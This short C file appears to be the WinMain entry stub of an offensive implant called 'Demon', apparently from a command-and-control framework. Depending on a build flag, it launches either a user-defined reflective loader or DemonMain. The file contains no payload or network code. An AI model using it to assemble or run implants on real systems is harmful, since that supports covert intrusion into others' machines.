#include <Demon.h>

#ifdef UDRL_EXE
#include "UserDefinedReflectiveLoader.h"
#endif

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    PRINTF( "WinMain: hInstance:[%p] hPrevInstance:[%p] lpCmdLine:[%s] nShowCmd:[%d]\n", hInstance, hPrevInstance, lpCmdLine, nShowCmd )
#ifdef UDRL_EXE
    ( ( void(*)() ) UserDefinedReflectiveLoader )();
#else
    DemonMain( NULL, NULL );
#endif
    return 0;
}